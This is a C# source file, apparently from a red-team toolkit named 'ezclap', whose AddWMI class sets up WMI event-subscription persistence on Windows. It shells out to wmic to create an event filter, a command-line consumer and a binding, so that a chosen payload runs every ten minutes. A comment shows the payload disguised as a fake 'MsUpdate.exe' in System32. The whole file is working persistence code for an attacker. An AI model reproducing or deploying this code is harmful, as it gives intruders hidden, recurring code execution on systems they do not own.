using System;
using System.Data;
using System.DirectoryServices;
using System.Collections.Generic;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;


/*  Name: AddWMI 
 *  Description: Creates a new WMI subscription/Event/Consumer using wmic. 
 *  The default WMIC commands are added as a comment down below.
 *  
 *  Params:
 *      - string[] name = Name of the WMI event to be added 
 *      - string payload = Payload string to be executed
 */

namespace ezclap
{
    public class AddWMI
    {
		public AddWMI(string[] names, string[] payload)
        {
            Random rnd = new Random();
            Array.ForEach(names, element => Initialize(element, payload[rnd.Next(0,payload.Length-1)]));
        }
		public static void Initialize(string name, string payload)
        {
            /*
             *wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="ScoringEngine_master", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

              wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="ScoringEngine_master", ExecutablePath="C:\\Windows\\System32\\MsUpdate.exe",CommandLineTemplate="C:\\Windows\\System32\\MsUpdate.exe"

              wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"ScoringEngine_master\"", Consumer="CommandLineEventConsumer.Name=\"ScoringEngine_master\"" 
             * 
             */

            string arg1 = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"" + name + "\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"";
            string arg2 = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"" + name + "\", ExecutablePath=\"" + payload + "\",CommandLineTemplate=\"" + payload + "\" ";
            string arg3 = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"" + name + "\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"" + name + "\\\"\"";
            
            System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg1);
            System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg2);
            System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg3);
        }
    }
}
